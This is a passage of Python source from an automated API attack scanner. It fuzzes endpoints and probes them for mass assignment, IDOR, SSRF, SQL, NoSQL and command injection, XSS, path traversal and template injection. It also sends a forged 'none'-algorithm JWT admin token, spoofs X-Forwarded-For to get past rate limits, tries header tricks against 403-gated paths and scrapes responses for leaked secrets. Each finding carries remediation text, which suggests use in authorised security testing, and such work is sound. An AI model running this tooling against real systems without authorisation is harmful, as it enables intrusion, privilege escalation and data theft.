            merged = list(dict.fromkeys(common_endpoints + extra_paths))
            print(f"{Colors.CYAN}[*] Including {len(merged) - len(common_endpoints)} recon-derived paths "
                  f"(specs/robots.txt){Colors.END}")
            common_endpoints = merged

        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        discovered = []
        
        print(f"{Colors.YELLOW}[*] Fuzzing {len(common_endpoints)} endpoints with {len(methods)} methods...{Colors.END}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for endpoint in common_endpoints:
                for method in methods:
                    futures.append(executor.submit(self._test_endpoint, endpoint, method))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    discovered.append(result)
                    print(f"{Colors.GREEN}[✓] Found: {result['method']} {result['endpoint']} (HTTP {result['status']}){Colors.END}")
                    
                    # Analyze JSON responses immediately
                    if 'json_data' in result:
                        analysis = self.analyze_json_response_data(result['json_data'], result['endpoint'])
                        if analysis:
                            print(f"{Colors.CYAN}    → JSON Analysis: {len(analysis.get('sensitive_keys', []))} sensitive keys, "
                                  f"{len(analysis.get('numeric_fields', []))} numeric fields, "
                                  f"{len(analysis.get('boolean_fields', []))} boolean fields{Colors.END}")
                        # Feed the attack chains: harvest object IDs and scan
                        # every JSON body for leaked credential material.
                        self._harvest_ids(result['json_data'])
                        self.scan_response_secrets(json.dumps(result['json_data']), result['endpoint'])
        
        self.endpoints = discovered
        print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Discovered {len(discovered)} active endpoints{Colors.END}\n")
        return discovered

    def analyze_json_response_data(self, json_data: Any, endpoint: str) -> Dict:
        """Analyze JSON data without needing response object"""
        try:
            analysis = {
                'endpoint': endpoint,
                'structure': self._get_json_structure(json_data),
                'sensitive_keys': self._find_sensitive_keys(json_data),
                'numeric_fields': self._find_numeric_fields(json_data),
                'boolean_fields': self._find_boolean_fields(json_data),
                'id_fields': self._find_id_fields(json_data),
                'url_fields': self._find_url_fields(json_data),
                'nested_objects': self._find_nested_objects(json_data),
                'array_fields': self._find_array_fields(json_data)
            }
            self.json_patterns.append(analysis)
            return analysis
        except:
            return {}

    def _test_endpoint(self, endpoint: str, method: str) -> Dict:
        """Test if an endpoint exists and analyze response"""
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.session.request(
                method=method,
                url=url,
                timeout=10,
                verify=False,
                allow_redirects=False,
                proxies=self.proxy
            )
            
            if response.status_code != 404:
                result = {
                    'endpoint': endpoint,
                    'method': method,
                    'status': response.status_code,
                    'content_type': response.headers.get('Content-Type', ''),
                    'length': len(response.content)
                }
                
                # Try to parse JSON response
                try:
                    json_data = response.json()
                    result['json_data'] = json_data
                    result['has_json'] = True
                except:
                    result['has_json'] = False
                
                return result
        except Exception as e:
            pass
        return None

    def test_api_data_manipulation(self, endpoint_data: Dict):
        """Test API data manipulation vulnerabilities"""
        if not endpoint_data.get('has_json') or endpoint_data.get('method') not in ['POST', 'PUT', 'PATCH']:
            return
        
        print(f"\n{Colors.BOLD}[+] Phase: API Data Manipulation Testing - {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        original_data = endpoint_data.get('json_data', {})
        
        # Analyze the JSON structure
        analysis = self.analyze_json_response_data(original_data, endpoint_data['endpoint'])
        
        # Generate manipulated versions
        manipulated_versions = self.manipulate_json_data(original_data, analysis)
        
        print(f"{Colors.YELLOW}[*] Testing {len(manipulated_versions)} data manipulation scenarios...{Colors.END}")
        
        # Get baseline response
        try:
            baseline_response = self.session.request(
                endpoint_data['method'],
                url,
                json=original_data,
                timeout=10,
                verify=False,
                proxies=self.proxy
            )
            baseline_length = len(baseline_response.content)
            baseline_status = baseline_response.status_code
        except:
            return
        
        # Test each manipulation
        for manipulation in manipulated_versions[:50]:  # Limit tests
            try:
                response = self.session.request(
                    endpoint_data['method'],
                    url,
                    json=manipulation['data'],
                    timeout=10,
                    verify=False,
                    proxies=self.proxy
                )
                
                # Check for successful manipulation
                if response.status_code == 200 and abs(len(response.content) - baseline_length) > 10:
                    # Verify the manipulation was accepted
                    if manipulation['type'] == 'boolean_flip':
                        self._check_boolean_flip_success(endpoint_data, manipulation, response)
                    elif manipulation['type'] == 'numeric_manipulation':
                        self._check_numeric_manipulation_success(endpoint_data, manipulation, response)
                    elif manipulation['type'] == 'mass_assignment':
                        self._check_mass_assignment_success(endpoint_data, manipulation, response)
                    elif manipulation['type'] == 'idor_test':
                        self._check_idor_success(endpoint_data, manipulation, response)
                    elif manipulation['type'] == 'ssrf_test':
                        self._check_ssrf_success(endpoint_data, manipulation, response)
                        
            except Exception as e:
                pass

    def _check_boolean_flip_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if boolean flip was successful"""
        try:
            response_data = response.json()
            # Check if the flipped value is reflected
            if str(manipulation['modified']).lower() in str(response_data).lower():
                self._add_finding(
                    endpoint=endpoint_data['endpoint'],
                    method=endpoint_data['method'],
                    vuln_type='Privilege Escalation via Boolean Manipulation',
                    severity='CRITICAL',
                    description=f'Boolean field "{manipulation["field"]}" can be manipulated from {manipulation["original"]} to {manipulation["modified"]}',
                    payload=json.dumps(manipulation['data'], indent=2)[:200],
                    response_code=response.status_code,
                    evidence=f'Field successfully changed: {manipulation["field"]}',
                    remediation='Implement proper authorization checks. Validate user permissions before accepting boolean field changes.',
                    manipulation_details=f'Field: {manipulation["field"]}, Original: {manipulation["original"]}, Modified: {manipulation["modified"]}'
                )
                print(f"{Colors.RED}[!] Boolean manipulation successful: {manipulation['field']}{Colors.END}")
        except:
            pass

    def _check_numeric_manipulation_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if numeric manipulation was successful"""
        try:
            response_data = response.json()
            # Look for price/amount manipulation acceptance
            if manipulation['modified'] in [0, 0.01, -1] and response.status_code == 200:
                self._add_finding(
                    endpoint=endpoint_data['endpoint'],
                    method=endpoint_data['method'],
                    vuln_type='Price/Quantity Manipulation',
                    severity='CRITICAL',
                    description=f'Numeric field "{manipulation["field"]}" can be manipulated to {manipulation["modified"]}',
                    payload=json.dumps(manipulation['data'], indent=2)[:200],
                    response_code=response.status_code,
                    evidence=f'Numeric field accepted suspicious value: {manipulation["modified"]}',
                    remediation='Implement server-side validation for all numeric fields. Validate price and quantity ranges.',
                    manipulation_details=f'Field: {manipulation["field"]}, Original: {manipulation["original"]}, Modified: {manipulation["modified"]}'
                )
                print(f"{Colors.RED}[!] Numeric manipulation successful: {manipulation['field']} = {manipulation['modified']}{Colors.END}")
        except:
            pass

    def _check_mass_assignment_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if mass assignment was successful"""
        try:
            response_data = response.json()
            # Check if privilege fields were accepted
            privilege_indicators = ['admin', 'role', 'permission', 'privileges', 'is_admin', 'superuser']
            response_str = str(response_data).lower()
            
            if any(indicator in response_str for indicator in privilege_indicators):
                self._add_finding(
                    endpoint=endpoint_data['endpoint'],
                    method=endpoint_data['method'],
                    vuln_type='Mass Assignment / Privilege Escalation',
                    severity='CRITICAL',
                    description=f'API accepts unauthorized privilege fields: {manipulation["modified"]}',
                    payload=json.dumps(manipulation['data'], indent=2)[:200],
                    response_code=response.status_code,
                    evidence=f'Privilege fields reflected in response',
                    remediation='Implement whitelist of allowed fields. Use separate DTOs for user input and internal models.',
                    manipulation_details=f'Added fields: {manipulation["modified"]}'
                )
                print(f"{Colors.RED}[!] Mass assignment successful - privilege escalation possible{Colors.END}")
        except:
            pass

    def _check_idor_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if IDOR manipulation was successful"""
        if response.status_code == 200:
            try:
                response_data = response.json()
                # If we got data back with different ID, it's IDOR
                if manipulation['modified'] != manipulation['original']:
                    self._add_finding(
                        endpoint=endpoint_data['endpoint'],
                        method=endpoint_data['method'],
                        vuln_type='Insecure Direct Object Reference (IDOR)',
                        severity='HIGH',
                        description=f'ID field "{manipulation["field"]}" allows unauthorized access',
                        payload=json.dumps(manipulation['data'], indent=2)[:200],
                        response_code=response.status_code,
                        evidence=f'Accessed different object by changing ID from {manipulation["original"]} to {manipulation["modified"]}',
                        remediation='Implement proper authorization checks for object access. Verify user owns the object.',
                        manipulation_details=f'Field: {manipulation["field"]}, Original ID: {manipulation["original"]}, Accessed ID: {manipulation["modified"]}'
                    )
                    print(f"{Colors.RED}[!] IDOR vulnerability: {manipulation['field']}{Colors.END}")
            except:
                pass

    def _check_ssrf_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
        """Check if SSRF was successful"""
        # Check for indicators of internal access
        ssrf_indicators = ['meta-data', 'ami-id', 'instance-id', 'computeMetadata', 'privateIp', 'security-credentials']
        
        if any(indicator in response.text for indicator in ssrf_indicators):
            self._add_finding(
                endpoint=endpoint_data['endpoint'],
                method=endpoint_data['method'],
                vuln_type='Server-Side Request Forgery (SSRF)',
                severity='CRITICAL',
                description=f'SSRF via URL field "{manipulation["field"]}"',
                payload=manipulation['modified'],
                response_code=response.status_code,
                evidence=f'Internal/cloud metadata accessible',
                remediation='Implement URL whitelist. Validate and sanitize all URL inputs. Use separate networks for internal services.',
                manipulation_details=f'Field: {manipulation["field"]}, SSRF URL: {manipulation["modified"]}'
            )
            print(f"{Colors.RED}[!] SSRF vulnerability: {manipulation['field']}{Colors.END}")

    def test_graphql_introspection(self):
        """Test for GraphQL introspection and unauthorized queries"""
        print(f"\n{Colors.YELLOW}[*] Testing GraphQL endpoints...{Colors.END}")
        
        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/query']
        
        for endpoint in graphql_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            for payload in self.payloads['graphql_attacks']:
                try:
                    # Try as GET query
                    response_get = self.session.get(
                        url,
                        params={'query': payload},
                        timeout=10,
                        verify=False,
                        proxies=self.proxy
                    )
                    
                    # Try as POST
                    response_post = self.session.post(
                        url,
                        json={'query': payload},
                        timeout=10,
                        verify=False,
                        proxies=self.proxy
                    )
                    
                    for response in [response_get, response_post]:
                        if response.status_code == 200:
                            response_text = response.text.lower()
                            
                            # Check for successful introspection
                            if '__schema' in payload and ('types' in response_text or 'fields' in response_text):
                                self._add_finding(
                                    endpoint=endpoint,
                                    method='POST',
                                    vuln_type='GraphQL Introspection Enabled',
                                    severity='MEDIUM',
                                    description='GraphQL introspection is enabled, revealing API schema',
                                    payload=payload,
                                    response_code=response.status_code,
                                    evidence='Schema information disclosed',
                                    remediation='Disable introspection in production environments.',
                                    manipulation_details='GraphQL schema exposed'
                                )
                                print(f"{Colors.YELLOW}[!] GraphQL introspection enabled{Colors.END}")
                            
                            # Check for sensitive data exposure
                            elif any(field in response_text for field in ['password', 'ssn', 'secret', 'token']):
                                self._add_finding(
                                    endpoint=endpoint,
                                    method='POST',
                                    vuln_type='GraphQL Sensitive Data Exposure',
                                    severity='HIGH',
                                    description='GraphQL query returns sensitive fields',
                                    payload=payload,
                                    response_code=response.status_code,
                                    evidence='Sensitive data fields accessible',
                                    remediation='Implement field-level authorization. Restrict sensitive field access.',
                                    manipulation_details='Sensitive fields exposed via GraphQL'
                                )
                                print(f"{Colors.RED}[!] GraphQL sensitive data exposure{Colors.END}")
                
                except Exception:
                    pass

    def test_authentication_bypass(self):
        """Test for authentication bypass techniques"""
        print(f"\n{Colors.YELLOW}[*] Testing authentication bypass techniques...{Colors.END}")
        
        # Test JWT manipulation
        if 'Authorization' in self.headers or 'authorization' in self.headers:
            auth_header = self.headers.get('Authorization') or self.headers.get('authorization', '')
            
            if 'Bearer' in auth_header:
                print(f"{Colors.CYAN}[*] Testing JWT token manipulation...{Colors.END}")
                
                # Test with 'none' algorithm
                none_token = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.'
                
                test_headers = self.headers.copy()
                test_headers['Authorization'] = f'Bearer {none_token}'
                
                for endpoint_data in self.endpoints[:5]:
                    try:
                        url = f"{self.base_url}{endpoint_data['endpoint']}"
                        response = self.session.request(
                            endpoint_data['method'],
                            url,
                            headers=test_headers,
                            timeout=10,
                            verify=False,
                            proxies=self.proxy
                        )
                        
                        if response.status_code in [200, 201, 204]:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='JWT Algorithm Confusion',
                                severity='CRITICAL',
                                description='API accepts JWT with "none" algorithm, allowing authentication bypass',
                                payload=none_token,
                                response_code=response.status_code,
                                evidence='Token with "none" algorithm accepted',
                                remediation='Enforce specific JWT algorithms. Reject "none" algorithm tokens.',
                                manipulation_details='JWT algorithm set to "none"'
                            )
                            print(f"{Colors.RED}[!] JWT algorithm confusion vulnerability{Colors.END}")
                            break
                    except:
                        pass

    def test_rate_limiting(self):
        """Test for rate limiting bypass"""
        print(f"\n{Colors.YELLOW}[*] Testing rate limiting...{Colors.END}")
        
        if not self.endpoints:
            return
        
        test_endpoint = self.endpoints[0]
        url = f"{self.base_url}{test_endpoint['endpoint']}"
        
        # Test basic rate limiting
        success_count = 0
        for i in range(50):
            try:
                response = self.session.request(
                    test_endpoint['method'],
                    url,
                    timeout=5,
                    verify=False,
                    proxies=self.proxy
                )
                if response.status_code != 429:
                    success_count += 1
            except:
                pass
        
        if success_count > 45:
            self._add_finding(
                endpoint=test_endpoint['endpoint'],
                method=test_endpoint['method'],
                vuln_type='Missing Rate Limiting',
                severity='MEDIUM',
                description='API endpoint lacks rate limiting protection',
                payload='N/A',
                response_code=200,
                evidence=f'{success_count}/50 requests succeeded without rate limiting',
                remediation='Implement rate limiting per IP, user, or API key.',
                manipulation_details=f'{success_count} requests succeeded'
            )
            print(f"{Colors.YELLOW}[!] No rate limiting detected{Colors.END}")
        else:
            # Rate limiting IS present -- test whether spoofed client-IP
            # headers reset the bucket (per-IP limits keyed on XFF).
            for spoofed_ip in self.payloads['rate_limit_bypass']:
                try:
                    response = self.session.request(
                        test_endpoint['method'], url,
                        headers={'X-Forwarded-For': spoofed_ip, 'X-Real-IP': spoofed_ip},
                        timeout=5, verify=False, proxies=self.proxy)
                    if response.status_code != 429:
                        self._add_finding(
                            endpoint=test_endpoint['endpoint'],
                            method=test_endpoint['method'],
                            vuln_type='Rate Limit Bypass via IP Spoofing Headers',
                            severity='MEDIUM',
                            description='Rate limit resets when X-Forwarded-For/X-Real-IP is changed',
                            payload=f'X-Forwarded-For: {spoofed_ip}',
                            response_code=response.status_code,
                            evidence=f'429 became {response.status_code} with spoofed client IP',
                            remediation='Key rate limits on authenticated identity or the true socket IP, not client-supplied headers.',
                            manipulation_details=f'Spoofed IP: {spoofed_ip}'
                        )
                        print(f"{Colors.YELLOW}[!] Rate limit bypassed via X-Forwarded-For: {spoofed_ip}{Colors.END}")
                        break
                except Exception:
                    pass

    def fuzz_parameters(self, endpoint_data: Dict):
        """Fuzz endpoint parameters"""
        print(f"\n{Colors.BOLD}[+] Phase 2: Parameter Fuzzing - {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
        
        common_params = [
            'id', 'user', 'username', 'email', 'password', 'token',
            'file', 'filename', 'path', 'url', 'redirect', 'callback',
            'search', 'query', 'q', 'page', 'limit', 'offset',
            'admin', 'role', 'permission', 'debug', 'test',
            'price', 'amount', 'quantity', 'discount'
        ]
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        found_params = []
        
        for param in common_params:
            test_data = {param: "test123"}
            try:
                if endpoint_data['method'] == 'GET':
                    response = self.session.get(url, params=test_data, timeout=5, verify=False, proxies=self.proxy)
                else:
                    response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=5, verify=False, proxies=self.proxy)
                
                if response.status_code not in [404, 405]:
                    found_params.append(param)
                    print(f"{Colors.GREEN}[✓] Found parameter: {param}{Colors.END}")
                    
            except Exception:
                pass
        
        return found_params

    def test_sql_injection(self, endpoint_data: Dict, params: List[str]):
        """Test for SQL Injection vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing SQL Injection...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['sqli']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    sql_errors = [
                        'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                        'syntax error', 'unclosed quotation', 'quoted string',
                        'database error', 'warning: mysql', 'pg_query()',
                        'sqlstate', 'db2 sql error', 'odbc driver', 'microsoft sql'
                    ]
                    
                    response_text = response.text.lower()
                    
                    for error in sql_errors:
                        if error in response_text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='SQL Injection',
                                severity='CRITICAL',
                                description=f'SQL injection vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'SQL error pattern detected: {error}',
                                remediation='Use parameterized queries/prepared statements. Implement input validation and sanitization.'
                            )
                            print(f"{Colors.RED}[!] SQL Injection found in parameter: {param}{Colors.END}")
                            break
                    
                    # Time-based detection
                    if 'WAITFOR' in payload or 'SLEEP' in payload.upper():
                        if response.elapsed.total_seconds() > 4:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Blind SQL Injection (Time-based)',
                                severity='CRITICAL',
                                description=f'Time-based blind SQL injection detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'Response delayed by {response.elapsed.total_seconds():.2f} seconds',
                                remediation='Use parameterized queries/prepared statements. Implement input validation.'
                            )
                            print(f"{Colors.RED}[!] Blind SQL Injection (time-based) found in parameter: {param}{Colors.END}")
                
                except Exception as e:
                    pass

    def test_xss(self, endpoint_data: Dict, params: List[str]):
        """Test for Cross-Site Scripting vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing XSS...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['xss']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    if payload in response.text or urllib.parse.quote(payload) in response.text:
                        if '<script>' in response.text.lower() or 'onerror=' in response.text.lower() or 'onload=' in response.text.lower():
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Cross-Site Scripting (XSS)',
                                severity='HIGH',
                                description=f'XSS vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence='Payload reflected in response without proper encoding',
                                remediation='Implement output encoding, Content Security Policy (CSP), and input validation.'
                            )
                            print(f"{Colors.RED}[!] XSS found in parameter: {param}{Colors.END}")
                            break
                
                except Exception:
                    pass

    def test_command_injection(self, endpoint_data: Dict, params: List[str]):
        """Test for Command Injection vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing Command Injection...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['command_injection']:
                test_data = {param: payload}
                
                try:
                    start_time = time.time()
                    
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=15, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=15, verify=False, proxies=self.proxy)
                    
                    elapsed = time.time() - start_time
                    
                    cmd_patterns = [
                        'root:', 'bin:', 'daemon:', '/bin/bash', '/bin/sh',
                        'uid=', 'gid=', '[boot loader]', 'PING', '64 bytes from',
                        'www-data', 'nobody'
                    ]
                    
                    for pattern in cmd_patterns:
                        if pattern in response.text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Command Injection',
                                severity='CRITICAL',
                                description=f'Command injection vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'Command output detected in response: {pattern}',
                                remediation='Avoid system calls. Use safe APIs. Implement strict input validation and whitelist allowed commands.'
                            )
                            print(f"{Colors.RED}[!] Command Injection found in parameter: {param}{Colors.END}")
                            break
                    
                    if 'sleep' in payload and elapsed > 4:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'],
                            method=endpoint_data['method'],
                            vuln_type='Blind Command Injection',
                            severity='CRITICAL',
                            description=f'Time-based command injection detected in parameter "{param}"',
                            payload=payload,
                            response_code=response.status_code,
                            evidence=f'Response delayed by {elapsed:.2f} seconds',
                            remediation='Avoid system calls. Use safe APIs. Implement strict input validation.'
                        )
                        print(f"{Colors.RED}[!] Blind Command Injection found in parameter: {param}{Colors.END}")
                
                except Exception:
                    pass

    def test_path_traversal(self, endpoint_data: Dict, params: List[str]):
        """Test for Path Traversal vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing Path Traversal...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['path_traversal']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    traversal_patterns = [
                        'root:', 'bin:', 'daemon:',
                        '[boot loader]', '[operating systems]',
                        '; for 16-bit app support'
                    ]
                    
                    for pattern in traversal_patterns:
                        if pattern in response.text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Path Traversal',
                                severity='HIGH',
                                description=f'Path traversal vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'System file content detected: {pattern}',
                                remediation='Implement strict path validation. Use whitelist of allowed paths. Avoid direct file access.'
                            )
                            print(f"{Colors.RED}[!] Path Traversal found in parameter: {param}{Colors.END}")
                            break
                
                except Exception:
                    pass

    def test_ssrf(self, endpoint_data: Dict, params: List[str]):
        """Test for Server-Side Request Forgery vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing SSRF...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for param in params:
            for payload in self.payloads['ssrf']:
                test_data = {param: payload}
                
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                    
                    ssrf_patterns = [
                        'ami-id', 'instance-id', 'security-credentials',
                        'computeMetadata', 'latest/meta-data', 'AccessKeyId',
                        'privateIp', 'publicIp'
                    ]
                    
                    for pattern in ssrf_patterns:
                        if pattern in response.text:
                            self._add_finding(
                                endpoint=endpoint_data['endpoint'],
                                method=endpoint_data['method'],
                                vuln_type='Server-Side Request Forgery (SSRF)',
                                severity='CRITICAL',
                                description=f'SSRF vulnerability detected in parameter "{param}"',
                                payload=payload,
                                response_code=response.status_code,
                                evidence=f'Internal/cloud metadata accessible: {pattern}',
                                remediation='Implement URL whitelist. Disable redirects. Use separate networks for internal services.'
                            )
                            print(f"{Colors.RED}[!] SSRF found in parameter: {param}{Colors.END}")
                            break
                
                except Exception:
                    pass

    def test_idor(self, endpoint_data: Dict, params: List[str]):
        """Test for Insecure Direct Object Reference vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Testing IDOR...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        if not any(keyword in endpoint_data['endpoint'].lower() for keyword in ['user', 'profile', 'account', 'order', 'document', 'file']):
            return
        
        for param in params:
            if param.lower() in ['id', 'user', 'userid', 'accountid', 'orderid']:
                responses = {}
                
                for test_id in self.payloads['idor']:
                    test_data = {param: test_id}
                    
                    try:
                        if endpoint_data['method'] == 'GET':
                            response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                        else:
                            response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                        
                        if response.status_code == 200:
                            responses[test_id] = len(response.content)
                    
                    except Exception:
                        pass
                
                if len(responses) > 1 and len(set(responses.values())) > 1:
                    self._add_finding(
                        endpoint=endpoint_data['endpoint'],
                        method=endpoint_data['method'],
                        vuln_type='Insecure Direct Object Reference (IDOR)',
                        severity='HIGH',
                        description=f'IDOR vulnerability detected - unauthorized access to objects via parameter "{param}"',
                        payload=', '.join(responses.keys()),
                        response_code=200,
                        evidence=f'Multiple object IDs accessible without proper authorization check',
                        remediation='Implement proper authorization checks. Verify user permissions before accessing objects.'
                    )
                    print(f"{Colors.RED}[!] IDOR found in parameter: {param}{Colors.END}")

    # ==================================================================
    # API-specific attack methods (OWASP API Security Top 10)
    # ==================================================================

    def test_nosql_injection(self, endpoint_data: Dict, params: List[str]):
        """Test for NoSQL (MongoDB-style) operator injection -- API5/API8"""
        print(f"{Colors.YELLOW}[*] Testing NoSQL Injection...{Colors.END}")

        url = f"{self.base_url}{endpoint_data['endpoint']}"

        for param in params:
            for payload in self.payloads['nosqli']:
                try:
                    parsed_payload = json.loads(payload)
                except ValueError:
                    parsed_payload = payload

                try:
                    start_time = time.time()
                    if endpoint_data['method'] == 'GET':
                        # Operator injection via bracketed query params: param[$ne]=
                        if isinstance(parsed_payload, dict):
                            operator = list(parsed_payload.keys())[0]
                            test_params = {f"{param}[{operator}]": parsed_payload[operator]}
                        else:
                            test_params = {param: payload}
                        response = self.session.get(url, params=test_params, timeout=15, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url,
                                                        json={param: parsed_payload},
                                                        timeout=15, verify=False, proxies=self.proxy)
                    elapsed = time.time() - start_time

                    nosql_errors = ['mongoerror', 'mongodb', 'bson', 'cast to objectid',
                                    'e11000', '$where', 'mapreduce', 'couchdb', 'unexpected token $']
                    response_lower = response.text.lower()

                    if any(err in response_lower for err in nosql_errors):
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
                            vuln_type='NoSQL Injection', severity='CRITICAL',
                            description=f'NoSQL operator injection in parameter "{param}"',
                            payload=payload, response_code=response.status_code,
                            evidence='NoSQL engine error pattern in response',
                            remediation='Sanitize operator keys ($gt/$ne/$where) from user input; use typed query builders.'
                        )
                        print(f"{Colors.RED}[!] NoSQL Injection found in parameter: {param}{Colors.END}")
                        break

                    # $where sleep-based blind detection
                    if 'sleep' in payload and elapsed > 4:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
                            vuln_type='Blind NoSQL Injection (Time-based)', severity='CRITICAL',
                            description=f'$where sleep() delay observed via parameter "{param}"',
                            payload=payload, response_code=response.status_code,
                            evidence=f'Response delayed {elapsed:.2f}s',
                            remediation='Disable $where/server-side JS in MongoDB; sanitize operator input.'
                        )
                        print(f"{Colors.RED}[!] Blind NoSQL Injection found in parameter: {param}{Colors.END}")
                except Exception:
                    pass

    def test_ssti(self, endpoint_data: Dict, params: List[str]):
        """Test for server-side template injection in API parameters"""
        print(f"{Colors.YELLOW}[*] Testing SSTI...{Colors.END}")

        url = f"{self.base_url}{endpoint_data['endpoint']}"

        for param in params:
            for payload in self.payloads['ssti']:
                test_data = {param: payload}
                try:
                    if endpoint_data['method'] == 'GET':
                        response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
                    else:
                        response = self.session.request(endpoint_data['method'], url, json=test_data,
                                                        timeout=10, verify=False, proxies=self.proxy)

                    # 7*7 evaluated -> 49 present WITHOUT the raw payload echoed back
                    if '49' in response.text and payload not in response.text:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
                            vuln_type='Server-Side Template Injection (SSTI)', severity='CRITICAL',
                            description=f'Template expression evaluated in parameter "{param}"',
                            payload=payload, response_code=response.status_code,
                            evidence=f'Payload {payload} evaluated to 49',
                            remediation='Never pass user input into template engines; use sandboxed/logic-less templates.'
                        )
                        print(f"{Colors.RED}[!] SSTI found in parameter: {param} ({payload}){Colors.END}")
                        break
                except Exception:
                    pass

    def test_403_bypass(self, endpoint_data: Dict):
        """Header/path-mutation bypass battery for 401/403-gated endpoints"""
        if endpoint_data.get('status') not in (401, 403):
            return

        path = endpoint_data['endpoint']
        print(f"{Colors.YELLOW}[*] Testing 401/403 bypass on {path}...{Colors.END}")

        # -- Header-based bypasses ------------------------------------
        for header_set in self.BYPASS_HEADER_SETS:
            test_headers = {}
            for header, value in header_set.items():
                test_headers[header] = path if value is None else value
            try:
                # X-Original-URL/X-Rewrite-URL tricks are sent against "/"
                probe_path = '/' if any(h in ('X-Original-URL', 'X-Rewrite-URL') for h in test_headers) else path
                response = self.session.request(
                    endpoint_data['method'], f"{self.base_url}{probe_path}",
                    headers=test_headers, timeout=10, verify=False,
                    allow_redirects=False, proxies=self.proxy)
                if response.status_code in (200, 201, 204):
                    self._add_finding(
                        endpoint=path, method=endpoint_data['method'],
                        vuln_type='Access Control Bypass via Header', severity='CRITICAL',
                        description=f'{endpoint_data["status"]} gate bypassed with header(s): {", ".join(test_headers)}',
                        payload=json.dumps(test_headers), response_code=response.status_code,
                        evidence=f'HTTP {endpoint_data["status"]} became {response.status_code}',
                        remediation='Enforce authorization at the application layer, not via proxy path/IP heuristics. Strip client-supplied forwarding headers at the edge.'
                    )
                    print(f"{Colors.RED}[!] 403 bypass via headers: {list(test_headers.keys())}{Colors.END}")
